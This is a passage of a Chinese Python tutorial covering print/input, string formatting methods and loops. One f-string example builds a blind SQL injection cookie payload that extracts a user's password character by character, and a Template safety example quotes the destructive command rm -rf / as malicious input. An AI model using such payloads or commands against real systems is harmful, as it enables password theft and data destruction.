class="line"><span class="comment"># 同时输出字符串和变量，用+拼接</span></span><br><span class="line">info = <span class="string">&quot;你的名字是:&quot;</span> + name</span><br><span class="line"><span class="built_in">print</span>(info)  <span class="comment"># 你的名字是:Corazon</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##Print格式化输出</span></span><br><span class="line"><span class="comment"># 方法1：&#123;0&#125;、&#123;1&#125;、&#123;2&#125;分别表示j,i,j+i，单引号里面是输出格式。</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;你的名字是&#123;0&#125;,你的性别:&#123;1&#125;,你的年龄:&#123;2&#125;&quot;</span>.<span class="built_in">format</span>(name, sex, age))  <span class="comment"># 你的名字是Corazon,你的性别:Male,你的年龄:24</span></span><br><span class="line"><span class="comment"># 方法2：类似于C语言格式输出，使用%开头格式输出</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;你的名字是%s,你的性别:%s,你的年龄:%s&quot;</span> % (name, sex, age))  <span class="comment"># 你的名字是Corazon,你的性别:Male,你的年龄:24</span></span><br></pre></td></tr></table></figure>
<h4 id="input-函数">input()函数</h4>
<p>input函数是用来接收用户输入的数据，会返回一个字符串类型的数据。如果想要得到其他类型的数据进行强制类型转化。代码操作示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 允许用户在终端下输入自己的账号和密码</span></span><br><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;请输入您的姓名：&quot;</span>)</span><br><span class="line">year = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入您的出生年：&quot;</span>))</span><br><span class="line">month = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入您的出生月：&quot;</span>))</span><br><span class="line">day = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入您的出生日：&quot;</span>))</span><br><span class="line"><span class="comment"># 前面双引号内容是格式化字符串，%s就是占位符，占据一个位置，类似教室占座。</span></span><br><span class="line"><span class="comment"># 占位符%s最终会被后面的变量的值所替代。</span></span><br><span class="line"><span class="comment"># 中间的`%`是一个分隔符。</span></span><br><span class="line"><span class="comment"># 多个变量表达式必须使用小括号扩起来。</span></span><br><span class="line"><span class="comment"># %02d 以整数输出，如果不足2位整数的，左边加0补充进去</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;您好%s，您的出生日期为：%d-%02d-%02d&quot;</span> % (name,year, month, day))</span><br><span class="line"><span class="comment"># 执行结果</span></span><br><span class="line">请输入您的姓名：Corazon</span><br><span class="line">请输入您的出生年：<span class="number">2000</span></span><br><span class="line">请输入您的出生月：<span class="number">6</span></span><br><span class="line">请输入您的出生日：<span class="number">8</span></span><br><span class="line">您好Corazon，您的出生日期为：<span class="number">2000</span>-06-08</span><br></pre></td></tr></table></figure>
<h3 id="格式化输出">格式化输出</h3>
<p>话不多说</p>
<h4 id="格式化（传统方法）"><code>%</code> 格式化（传统方法）</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Alice&quot;</span></span><br><span class="line">age = <span class="number">30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Name: %s, Age: %d&quot;</span> % (name, age))  <span class="comment"># Name: Alice, Age: 30</span></span><br></pre></td></tr></table></figure>
<p><strong>高级控制：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 宽度与对齐</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[%10s]&quot;</span> % <span class="string">&quot;left&quot;</span>)    <span class="comment"># 右对齐：[      left]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[%-10s]&quot;</span> % <span class="string">&quot;right&quot;</span>)  <span class="comment"># 左对齐：[right     ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 浮点数精度</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;π: %.03f&quot;</span> % <span class="number">3.14159</span>)  <span class="comment"># π: 3.142</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a: %010.03f&quot;</span> % <span class="number">1.23456</span>)  <span class="comment"># a: 000001.235</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a: %.010f&quot;</span> % <span class="number">1.23456</span>)  <span class="comment"># a: 1.2345600000</span></span><br></pre></td></tr></table></figure>
<hr>
<h4 id="str-format-方法"><strong><code>str.format()</code> 方法</strong></h4>
<p>Python 2.6+版本支持str.format()` 方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Name: &#123;0&#125;, Age: &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;Bob&quot;</span>, <span class="number">40</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Name: &#123;name&#125;, Age: &#123;age&#125;&quot;</span>.<span class="built_in">format</span>(name=<span class="string">&quot;Bob&quot;</span>, age=<span class="number">40</span>))</span><br><span class="line">num=<span class="built_in">input</span>(<span class="string">&quot;你还有&#123;0&#125;次机会，\n请输入一个1到20的整数：&quot;</span>.<span class="built_in">format</span>(<span class="number">5</span>-count))</span><br></pre></td></tr></table></figure>
<p><strong>核心功能：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>位置参数</strong><br>
<code>&quot;&#123;0&#125; + &#123;1&#125; = &#123;2&#125;&quot;.format(1, 2, 3)</code> → <code>1 + 2 = 3</code></p>
</li>
<li class="lvl-2">
<p><strong>关键字参数</strong><br>
<code>&quot;User: &#123;username&#125;&quot;.format(username=&quot;admin&quot;)</code></p>
</li>
<li class="lvl-2">
<p><strong>混合使用</strong><br>
<code>&quot;&#123;0&#125; &#123;last&#125;&quot;.format(&quot;John&quot;, last=&quot;Doe&quot;)</code></p>
</li>
</ul>
<h4 id="格式化规范（-后定义格式）："><strong>格式化规范（<code>:</code> 后定义格式）：</strong></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数字格式化</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;π: &#123;:.3f&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">3.14159</span>))      <span class="comment"># π: 3.142</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hex: &#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">255</span>))          <span class="comment"># ff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文本对齐</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[&#123;:&gt;10&#125;]&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;right&quot;</span>))       <span class="comment"># [     right]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[&#123;:^10&#125;]&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;center&quot;</span>))      <span class="comment"># [  center  ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 符号显示</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Balance: &#123;:+d&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">100</span>))     <span class="comment"># +100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 千位分隔符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:,&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">1000000</span>))           <span class="comment"># 1,000,000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 百分比</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ratio: &#123;:.2%&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">0.25</span>))     <span class="comment"># 25.00%</span></span><br></pre></td></tr></table></figure>
<hr>
<h4 id="f-strings"><strong><code>f-strings</code></strong></h4>
<p>Python 3.6+，推荐。在渗透测试Python脚本中经常使用<code>f-strings</code>方式构建PayLoad</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Corazon&quot;</span></span><br><span class="line">age = <span class="number">35</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Name: <span class="subst">&#123;name&#125;</span>, Age: <span class="subst">&#123;age&#125;</span>&quot;</span>)  <span class="comment"># Name: Corazon, Age: 35</span></span><br></pre></td></tr></table></figure>
<p><strong>高级特性：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 表达式计算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Sum: <span class="subst">&#123;<span class="number">5</span> + <span class="number">3</span>&#125;</span>&quot;</span>)                <span class="comment"># Sum: 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数调用</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Uppercase: <span class="subst">&#123;<span class="string">&#x27;hello&#x27;</span>.upper()&#125;</span>&quot;</span>)  <span class="comment"># Uppercase: HELLO</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式控制</span></span><br><span class="line">pi = <span class="number">3.14159</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;π: <span class="subst">&#123;pi:<span class="number">.3</span>f&#125;</span>&quot;</span>)                 <span class="comment"># π: 3.142 与%格式一样</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Hex: <span class="subst">&#123;<span class="number">255</span>:x&#125;</span>, int: <span class="subst">&#123;<span class="number">0b11111111</span>:d&#125;</span>, Oct: <span class="subst">&#123;<span class="number">255</span>:o&#125;</span>, Bin: <span class="subst">&#123;<span class="number">255</span>:b&#125;</span>&quot;</span>) <span class="comment"># Hex: ff, int: 255, Oct: 377, Bin: 11111111</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对齐与填充（字符串后接&#x27;:&#x27;）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;<span class="string">&#x27;left&#x27;</span>:&lt;<span class="number">10</span>&#125;</span>]&quot;</span>)              <span class="comment"># [left      ]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;<span class="string">&#x27;right&#x27;</span>:&gt;<span class="number">10</span>&#125;</span>]&quot;</span>)             <span class="comment"># [     right]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;<span class="string">&#x27;center&#x27;</span>:^<span class="number">10</span>&#125;</span>]&quot;</span>)            <span class="comment"># [  center  ]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;<span class="string">&#x27;pad&#x27;</span>:*&gt;<span class="number">10</span>&#125;</span>]&quot;</span>)              <span class="comment"># [*******pad]</span></span><br><span class="line"><span class="comment"># 构建cookie SQL注入字典，爆破某一用户密码（部分）：</span></span><br><span class="line">cookies = &#123;<span class="string">&#x27;TrackingId&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;Tracking_id&#125;</span>&#x27; and ascii(substr((select password from <span class="subst">&#123;tablename&#125;</span> where username=&#x27;<span class="subst">&#123;username&#125;</span>&#x27;),<span class="subst">&#123;password_index&#125;</span>,1)) &gt; <span class="subst">&#123;ascii_mid&#125;</span>--+;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 日期格式化</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">now = datetime.now()</span><br><span class="line"><span class="built_in">print</span>(now)                            <span class="comment"># 2025-07-16 14:16:57.921635</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Now: <span class="subst">&#123;now:%Y-%m-%d&#125;</span>&quot;</span>)         <span class="comment"># Now: 2025-07-16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原始字符串（避免转义）</span></span><br><span class="line">name = <span class="string">&quot;Corazon&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">fr&quot;Raw: \n <span class="subst">&#123;name&#125;</span>&quot;</span>)             <span class="comment"># Raw: \n Corazon</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Raw: \\n <span class="subst">&#123;name&#125;</span>&quot;</span>)             <span class="comment"># Raw: \n Corazon</span></span><br></pre></td></tr></table></figure>
<hr>
<h4 id="模板字符串（string-Template）"><strong>模板字符串（<code>string.Template</code>）</strong></h4>
<p><code>string.Template</code> 是 Python 标准库中提供的一种安全、简单的字符串替换机制，特别适合处理用户提供的模板或需要防止注入攻击的场景。</p>
<p><strong>基本用法：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line"><span class="comment">#01 创建模板对象</span></span><br><span class="line">t = Template(<span class="string">&quot;Hello, $name! Today is $day.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 substitute() 方法进行安全替换：</span></span><br><span class="line">result = t.substitute(name=<span class="string">&quot;Alice&quot;</span>, day=<span class="string">&quot;Monday&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)                   <span class="comment"># 输出: Hello, Alice! Today is Monday.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 safe_substitute() 方法，当缺少变量时不会报错：</span></span><br><span class="line">result = t.safe_substitute(name=<span class="string">&quot;Bob&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)                   <span class="comment"># 输出: Hello, Bob! Today is $day.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#02 变量表示形式</span></span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单变量 ($var)</span></span><br><span class="line">t = Template(<span class="string">&quot;Welcome, $user!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(t.substitute(user=<span class="string">&quot;Admin&quot;</span>))  <span class="comment"># Welcome, Admin!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 包裹变量 ($&#123;var&#125;)</span></span><br><span class="line"><span class="comment"># 当变量名后需要紧跟字母、数字或下划线时使用,避免歧义：</span></span><br><span class="line">t = Template(<span class="string">&quot;Total: $&#123;amount&#125;USD&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(t.substitute(amount=<span class="number">100</span>))    <span class="comment"># Total: 100USD</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#03 使用字典进行替换</span></span><br><span class="line">data = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Corazon&quot;</span>, <span class="string">&quot;item&quot;</span>: <span class="string">&quot;book&quot;</span>, <span class="string">&quot;price&quot;</span>: <span class="number">29.99</span>&#125;</span><br><span class="line">t = Template(<span class="string">&quot;$name bought a $item for $$$price&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(t.substitute(data))  <span class="comment"># Corazon bought a book for $29.99</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#04 特殊字符处理</span></span><br><span class="line"><span class="comment"># 转义 `$` 符号，使用两个 `$` 表示字面值的美元符号：</span></span><br><span class="line">t = Template(<span class="string">&quot;Cost: $$ $amount&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(t.substitute(amount=<span class="number">50</span>))  <span class="comment"># Cost: $ 50</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理包含 `$` 的值</span></span><br><span class="line">t = Template(<span class="string">&quot;Value: $val&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(t.substitute(val=<span class="string">&quot;$100&quot;</span>))  <span class="comment"># Value: $100</span></span><br></pre></td></tr></table></figure>
<h5 id="高级用法">高级用法</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2.自定义分隔符（继承 Template）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyTemplate</span>(<span class="title class_ inherited__">Template</span>):</span><br><span class="line">    delimiter = <span class="string">&#x27;#&#x27;</span>  <span class="comment"># 将分隔符改为 #</span></span><br><span class="line">    idpattern = <span class="string">r&#x27;[a-z]+&#x27;</span>  <span class="comment"># 只允许小写字母变量名</span></span><br><span class="line">t = MyTemplate(<span class="string">&quot;Hello, #name! Your code is #code&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(t.substitute(name=<span class="string">&quot;Corazon&quot;</span>, code=<span class="string">&quot;XYZ123&quot;</span>))  <span class="comment"># Hello, Corazon! Your code is XYZ123</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.处理无效标识符</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SafeTemplate</span>(<span class="title class_ inherited__">Template</span>):</span><br><span class="line">    idpattern = <span class="string">r&#x27;[_a-z][_a-z0-9]*&#x27;</span>  <span class="comment"># 标准标识符规则</span></span><br><span class="line">t = SafeTemplate(<span class="string">&quot;$user_name: $score&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(t.substitute(user_name=<span class="string">&quot;Eve&quot;</span>, score=<span class="number">95</span>))  <span class="comment"># Eve: 95</span></span><br></pre></td></tr></table></figure>
<h5 id="安全特性">安全特性</h5>
<p><code>string.Template</code> 的主要安全优势：</p>
<ol>
<li class="lvl-3">
<p><strong>不执行表达式</strong>：不会像 f-strings 那样执行任意代码</p>
</li>
<li class="lvl-3">
<p><strong>无格式化功能</strong>：不能访问对象属性或执行方法</p>
</li>
<li class="lvl-3">
<p><strong>简单替换</strong>：只进行直接的字符串替换</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安全示例 - 防止注入攻击</span></span><br><span class="line">user_input = <span class="string">&quot;$&#123;os.system(&#x27;rm -rf /&#x27;)&#125;&quot;</span>  <span class="comment"># 恶意输入</span></span><br><span class="line">t = Template(<span class="string">&quot;User data: $data&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(t.safe_substitute(data=user_input))  <span class="comment"># 安全输出: User data: $&#123;os.system(&#x27;rm -rf /&#x27;)&#125;</span></span><br></pre></td></tr></table></figure>
<h5 id="实际应用场景">实际应用场景</h5>
<ol>
<li class="lvl-3">
<p>邮件模板</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">email_template = Template(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Dear $name,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your order #$order_id has been shipped.</span></span><br><span class="line"><span class="string">Tracking number: $tracking_num</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Regards,</span></span><br><span class="line"><span class="string">$company</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice&quot;</span>,</span><br><span class="line">    <span class="string">&quot;order_id&quot;</span>: <span class="string">&quot;12345&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tracking_num&quot;</span>: <span class="string">&quot;ZYX987&quot;</span>,</span><br><span class="line">    <span class="string">&quot;company&quot;</span>: <span class="string">&quot;ACME Corp&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(email_template.substitute(data))</span><br></pre></td></tr></table></figure>
<p><strong>2. 配置文件模板</strong></p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">config_template = Template(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[DATABASE]</span></span><br><span class="line"><span class="string">host = <span class="variable">$db_host</span></span></span><br><span class="line"><span class="string">port = <span class="variable">$db_port</span></span></span><br><span class="line"><span class="string">user = <span class="variable">$db_user</span></span></span><br><span class="line"><span class="string">password = <span class="variable">$db_pass</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">db_config = &#123;</span><br><span class="line">    <span class="string">&quot;db_host&quot;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">    <span class="string">&quot;db_port&quot;</span>: <span class="number">5432</span>,</span><br><span class="line">    <span class="string">&quot;db_user&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;db_pass&quot;</span>: <span class="string">&quot;secure123&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(config_template.substitute(db_config))</span><br></pre></td></tr></table></figure>
<p><strong>3. 多语言支持</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">templates = &#123;</span><br><span class="line">    <span class="string">&quot;en&quot;</span>: Template(<span class="string">&quot;Hello, <span class="variable">$name</span>!&quot;</span>),</span><br><span class="line">    <span class="string">&quot;es&quot;</span>: Template(<span class="string">&quot;¡Hola, <span class="variable">$name</span>!&quot;</span>),</span><br><span class="line">    <span class="string">&quot;fr&quot;</span>: Template(<span class="string">&quot;Bonjour, <span class="variable">$name</span>!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def greet(name, <span class="attribute">lang</span>=<span class="string">&quot;en&quot;</span>):</span><br><span class="line">    return templates[lang].substitute(<span class="attribute">name</span>=name)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(greet(<span class="string">&quot;Pierre&quot;</span>, <span class="string">&quot;fr&quot;</span>))  # Bonjour, Pierre!</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="其他方法"><strong>其他方法</strong></h4>
<p><strong>(1) 字符串拼接</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Name: &quot;</span> + name + <span class="string">&quot;, Age: &quot;</span> + <span class="built_in">str</span>(age))</span><br></pre></td></tr></table></figure>
<p><strong>(2) <code>str.join()</code> 处理列表</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">words = [<span class="string">&quot;Python&quot;</span>, <span class="string">&quot;is&quot;</span>, <span class="string">&quot;powerful&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; &quot;</span>.join(words))  <span class="comment"># Python is powerful</span></span><br></pre></td></tr></table></figure>
<hr>
<h4 id="总结对比"><strong>总结对比</strong></h4>
<table>
<thead>
<tr>
<th><strong>方法</strong></th>
<th><strong>易读性</strong></th>
<th><strong>灵活性</strong></th>
<th><strong>安全性</strong></th>
<th><strong>版本要求</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>%</code> 格式化</td>
<td>低</td>
<td>中</td>
<td>低</td>
<td>所有版本</td>
</tr>
<tr>
<td><code>str.format()</code></td>
<td>高</td>
<td>高</td>
<td>中</td>
<td>Python 2.6+</td>
</tr>
<tr>
<td><strong>f-strings</strong></td>
<td><strong>极高</strong></td>
<td><strong>极高</strong></td>
<td>中</td>
<td><strong>Python 3.6+</strong></td>
</tr>
<tr>
<td><code>string.Template</code></td>
<td>中</td>
<td>低</td>
<td><strong>高</strong></td>
<td>所有版本</td>
</tr>
</tbody>
</table>
<h2 id="流程控制语句"><strong>流程控制语句</strong></h2>
<p><strong>python流程控制语句介绍</strong></p>
<p>软件程序是由语句构成，而流程控制语句是用来控制程序中每条语句执行顺序的语句；可以通过控制语句实现更丰富的逻辑以及更强大的功能；几乎所有编程语言都有流程控制语句，功能也都基本相似，其流程控制方式有：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>顺序结构</p>
</li>
<li class="lvl-2">
<p>分支结构</p>
</li>
<li class="lvl-2">
<p>循环结构</p>
</li>
</ul>
<p>最简单最常用的就是顺序结构，即语句从上至下逐一执行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I am zkrc.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I like python.&quot;</span>) <span class="comment"># 从上到下依次执行</span></span><br></pre></td></tr></table></figure>
<h3 id="流程控制分支语句">流程控制分支语句</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 单分支语句语法结构：</span></span><br><span class="line"><span class="keyword">if</span> 表达式:</span><br><span class="line">    代码块 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 双分支语句语法结构：</span></span><br><span class="line"><span class="keyword">if</span> 表达式:</span><br><span class="line">    代码块<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    代码块<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if 表达式1:</span></span><br><span class="line">    代码块<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> 表达式<span class="number">2</span>:</span><br><span class="line">    代码块<span class="number">2</span></span><br><span class="line">...更多<span class="keyword">elif</span>语句</span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">    代码块 n</span><br></pre></td></tr></table></figure>
<p>双分支语句中的pass用法：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>空语句，不做任何事务处理，一般用作占位</p>
</li>
<li class="lvl-2">
<p>保证格式完整</p>
</li>
<li class="lvl-2">
<p>保证语义完整</p>
</li>
</ul>
<p><strong>一些高阶用法：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#01 打印num1和num2中较大的数</span></span><br><span class="line">num1, num2 = <span class="number">1</span>, <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(num1 <span class="keyword">if</span> num1 &gt; num2 <span class="keyword">else</span> num2)  <span class="comment"># 2</span></span><br></pre></td></tr></table></figure>
<h3 id="流程控制循环语句"><strong>流程控制循环语句</strong></h3>
<p>Python语言中的循环语句支持 while循环（条件循环）和for循环（遍历循环）</p>
<h4 id="流程控制循环语句-while"><strong>流程控制循环语句-while</strong></h4>
<p>循环语句语法格式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> 表达式:</span><br><span class="line">    循环体</span><br></pre></td></tr></table></figure>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        循环语句应用示例
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 无限循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 无限循环打印,间隔0.5秒。</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;boss&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 有限循环：从数字1打印输出到10</span></span><br><span class="line">count = <span class="number">1</span>          </span><br><span class="line"><span class="keyword">while</span> count &lt;= <span class="number">10</span>: </span><br><span class="line">    <span class="built_in">print</span>(count)</span><br><span class="line">    count+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br></pre></td></tr></table></figure>

    </div>
</div>
<h4 id="流程控制循环语句-for"><strong>流程控制循环语句-for</strong></h4>
<p>循环语句语法格式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> 迭代变量 <span class="keyword">in</span> 字符串|列表|元组|字典|集合：</span><br><span class="line">    代码块</span><br></pre></td></tr></table></figure>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        循环语句应用示例
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;zkrc&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> [<span class="string">&quot;张三&quot;</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="string">&quot;王五&quot;</span>]:</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#  range函数： range(start,end,step)     </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):  <span class="comment"># range(5)结果为[0,1,2,3,4]</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 偶数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">11</span>,<span class="number">2</span>):</span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line">结果:  前闭后开 不包含<span class="number">11</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>

    </div>
</div>
<h4 id="流程控制循环嵌套"><strong>流程控制循环嵌套</strong></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#01 独立嵌套</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):  <span class="comment">#5次</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):  <span class="comment">#5次</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  *&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#02 关联嵌套</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):  <span class="comment">#控制行数</span></span><br><span class="line">    